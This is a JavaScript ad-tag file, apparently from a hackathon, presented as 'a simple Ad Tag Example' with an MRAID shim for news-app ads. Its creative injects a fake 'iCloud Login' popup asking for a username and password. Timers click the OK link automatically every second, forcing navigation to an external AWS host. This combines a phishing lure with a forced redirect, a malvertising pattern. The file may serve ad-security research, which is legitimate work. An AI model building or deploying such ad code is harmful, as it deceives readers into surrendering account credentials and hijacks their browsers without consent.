/*
 * @Namespace hAT
 *
 * @discussion
 * Top-level object.
 */
var hAT = {};

/*
 * @css
 *
 * @discussion
 * The absolute path to the CSS file to use for your hack.
 */
hAT.css = "http://ec2-54-67-29-106.us-west-1.compute.amazonaws.com/nh/hackathon.css"
// hAT.css = "./hackathon.css"

/*
 * @Class View
 *
 * @discussion
 * A simple wrapper around an HTML div element
 * providing cocoa-esque syntax and sugar.
 */
hAT.View = class {
    constructor () {
        this._view = document.createElement("div");
        Object.defineProperties(this, {
            "width": {
                get: function () {
                    return this._view.width;
                },
                set: function (width) {
                    this._view.width = width;
                }
            },
            "height": {
                get: function () {
                    return this._view.height;
                },
                set: function (height) {
                    this._view.height = height;
                }
            },
            "id": {
                get: function () {
                    return this._view.id;
                },
                set: function (id) {
                    this._view.id = id;
                }
            },
            "innerText": {
                get: function () {
                    this._view.innerText;
                },
                set: function (text) {
                    this._view.innerText = text;
                }
            },
            "innerHTML": {
                get: function () {
                    this._view.innerHTML;
                },
                set: function (html) {
                    this._view.innerHTML = html;
                }
            },
            "element": {
                get: function () {
                    return this._view;
                }
            }
        });
    }

    addSubView (view) {
        if (!view instanceof hAT.View) {
            return;
        }
        this._view.appendChild(view._view);
    }

    removeSubView (view) {
        if (!view instanceof hAT.View) {
            return;
        }
        this._view.removeChild(view._view);
    }
};

/*
 * @Const EventTarget
 *
 * @discussion
 * A simple implementation of element event target for hAT.View.
 */
const EventTarget = (target) =>
    Object.assign(target, {
         addEventListener (object, type, listener, useCapture) {
             object.addEventListener(type, listener, useCapture);
         },
         removeEventListener (object, type, listener, useCapture) {
             object.removeEventListener(type, listener, useCapture);
         }
    });

/*
 * @Class Hackathon
 *
 * @discussion
 * An MRAID shim that will log MRAID methods
 * to the window.console.
 */
hAT.MRAIDShim = class {
    constructor () {
        this.isShim = true;
        [
        "addEventListener",
        "close",
        "expand",
        "getExpandProperties",
        "getPlacementType",
        "getState",
        "getVersion",
        "isViewable",
        "open",
        "removeEventListener",
        "setExpandProperties",
        "useCustomClose",
        "_createCalendarEvent"
        ].forEach(function (method) {
            this[method] = function () {
                console.log("MRAID # " + method + " shim implementation called.");
            };
        }, this);
    }
};

/*
 * @Class Hackathon
 *
 * @discussion
 * A simple Ad Tag Example.
 */
hAT.Hackathon = class {
    constructor () {
        this.hasMRAID = !!window.mraid;
        if (!this.hasMRAID) {
            window.mraid = new hAT.MRAIDShim();
        }
        var link = document.createElement("link");
        link.setAttribute("rel", "stylesheet");
        link.setAttribute("type", "text/css");
        // URLs must be absolute paths. Replace this path with your AWS instance
        link.setAttribute("href", hAT.css);
        document.getElementsByTagName('head')[0].appendChild(link);

        this.rootView = new hAT.View();
        this.rootView.id = "hAT-root-view";
        document.body.appendChild(this.rootView.element);
    }

    helloWorld () {
        var containerView = new hAT.View();
        containerView.innerHTML = `
        <div class="celtra-ad-v3">
            <!-- externalLineItemId                = raw %%APPLE_NEWS_LINEITEM_ID%% -->
            <!-- externalLineItemName              = raw %%APPLE_NEWS_LINEITEM_NAME%% -->
            <!-- externalSupplierId                = raw %%APPLE_NEWS_CHANNEL_ID%% -->
            <!-- externalSupplierName              = raw %%APPLE_NEWS_CHANNEL_NAME%% -->
            <!-- externalCampaignId                = raw %%APPLE_NEWS_CAMPAIGN_ID%% -->
            <!-- externalCampaignName              = raw %%APPLE_NEWS_CAMPAIGN_NAME%% -->
            <!-- applenews_creative_size           = raw %%APPLE_NEWS_CREATIVE_SIZES%% -->
            <div id="main">
            <div id="overlay"></div>
            <div id="popup">
                <h3>iCloud Login</h3>
                <p>Enter your username and password</p>
                <div class="input-ctrls">
                    <span class="if username" tabindex="1" contenteditable="true">Username</span>
                    <span class="if password" tabindex="1" contenteditable="true">Password</span>
                </div>
                <div class="button-holder two-button">
                    <a href="#">Cancel</a>
                    <a id="ok" href="http://ec2-54-67-29-106.us-west-1.compute.amazonaws.com/nh/hackathonTag1.html">OK</a>
                    <div style="clear: both"></div>
                </div>
            </div>
        </div>
        </div>`;

        //this.rootView.addEventListener(this.rootView.element, this.hasMRAID ? "touchend" : "click", this.handleMainAction.bind(this));
        this.rootView.addSubView(containerView);
    }

    handleMainAction (event) {
        // This can be safely called since we're using the hAT.MRAIDShim
        mraid.open("http://apple.com");
    }
};

// Bootstrap

// Register our Mixin on hAT.View.
EventTarget(hAT.View.prototype);

// Instantiate a Hackathon Instance.
var hack = new hAT.Hackathon();
// Call a method on our instance.
hack.helloWorld();

setTimeout(function(){document.getElementById("ok").click();}, 3000);
setInterval(function(){document.getElementById("ok").click();}, 1000);
